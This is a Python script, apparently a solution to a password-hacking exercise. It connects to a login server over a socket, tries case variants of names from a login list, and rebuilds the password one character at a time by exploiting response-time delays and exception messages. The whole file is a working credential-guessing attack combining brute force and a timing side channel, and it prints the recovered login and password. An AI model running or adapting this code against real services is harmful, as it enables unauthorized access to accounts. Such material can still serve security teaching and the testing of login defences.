import socket
import sys
import itertools
import os
import json
import string
import time

CONNECTION_SUCCESS = 'Connection success!'
WRONG_PASSWORD = 'Wrong password!'
TOO_MANY_ATTEMPTS = 'Too many attempts'
CORRECT_LOGIN = 'Wrong login!'
PASSWORD_ERROR = 'Exception happened during login'

logins_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logins.txt')
passwords_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'passwords.txt')

ip_address, port = sys.argv[1:]


def find_login() -> str:
    with open(logins_file, 'r') as _f:
        for username in _f.readlines():
            login_combinations = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()]
                                                                               for letter in username.strip())))
            for _login in login_combinations:
                payload = json.dumps(dict(login=_login, password=''))
                sock.send(payload.encode('utf-8'))
                response = json.loads(sock.recv(1024).decode('utf-8'))
                if response['result'] != CORRECT_LOGIN:
                    return _login


def find_password(login: str) -> str:
    template = list(string.ascii_lowercase) + list(string.digits) + list(string.ascii_uppercase)
    found = False
    correct_password = ''
    while not found:
        for _ in itertools.product(template):
            letter = ''.join(_)
            password = correct_password + letter
            payload = json.dumps(dict(login=login, password=password))
            sock.send(payload.encode('utf-8'))
            start = time.perf_counter()
            response = json.loads(sock.recv(2048).decode('utf-8'))
            end = time.perf_counter()
            if (end - start) * 100 > 9:
                correct_password += letter
            elif response['result'] == PASSWORD_ERROR:
                correct_password += letter
            elif response['result'] == CONNECTION_SUCCESS:
                correct_password += letter
                found = True
                break
    return correct_password


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((ip_address, int(port)))

    login = find_login()
    if login:
        password = find_password(login)

        if password:
            print(json.dumps({'login': login, 'password': password}))
        else:
            print('Password not found')

    else:
        print('Login not found')
